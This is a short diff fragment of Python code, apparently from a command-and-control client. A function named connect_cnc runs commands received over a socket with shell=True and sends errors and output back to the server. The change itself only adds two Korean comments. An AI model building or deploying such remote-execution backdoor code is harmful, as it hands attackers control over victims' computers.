@@ -32,6 +32,8 @@ def connect_cnc(s):
         except Exception as e:
             s.send(str(e).encode("euc-kr", "ignore"))
 
+        # 프로세스 생성 및 관리
+        # stdin, stdout, stderr 서버 측으로 전송
         proc = subprocess.Popen(
             command,
             shell=True,
